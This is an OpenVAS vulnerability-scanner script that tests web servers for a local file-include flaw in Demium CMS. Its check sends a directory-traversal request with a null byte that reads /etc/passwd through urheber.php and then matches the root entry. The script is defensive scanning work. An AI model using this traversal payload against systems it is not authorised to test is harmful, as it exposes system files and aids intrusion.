###############################################################################
# OpenVAS Vulnerability Test
# $Id: demium_cms_multiple_vulnerabilities.nasl 4655 2016-12-01 15:18:13Z teissa $
#
# Demium CMS Multiple Local File Include and SQL Injection
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Demium CMS is prone to multiple local file-include vulnerabilities and
  SQL-injection vulnerabilities because it fails to properly sanitize
  user-supplied input.

  An attacker can exploit the local file-include vulnerabilities using
  directory-traversal strings to view and execute arbitrary local files within
  the context of the webserver process. Information harvested may aid in further
  attacks.

  The attacker can exploit the SQL-injection vulnerabilities to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the
  underlying database.

  Demium CMS 0.2.1 Beta is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100008);
 script_version("$Revision: 4655 $");
 script_tag(name:"last_modification", value:"$Date: 2016-12-01 16:18:13 +0100 (Thu, 01 Dec 2016) $");
 script_tag(name:"creation_date", value:"2009-03-02 16:07:07 +0100 (Mon, 02 Mar 2009)");
 script_bugtraq_id(33933);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_name("Demium CMS Multiple Local File Include and SQL Injection Vulnerabilities");

 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list("/demium", cgi_dirs());

foreach d (dir)
{ 
 url = string(d, "/urheber.php?name=../../../../../../../../../../etc/passwd%00");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )exit(0);

 if (egrep(pattern:"root:x:0:[01]:.*", string: buf))
   {    
    security_message(port:port);
    exit(0);
   }
}

exit(0);
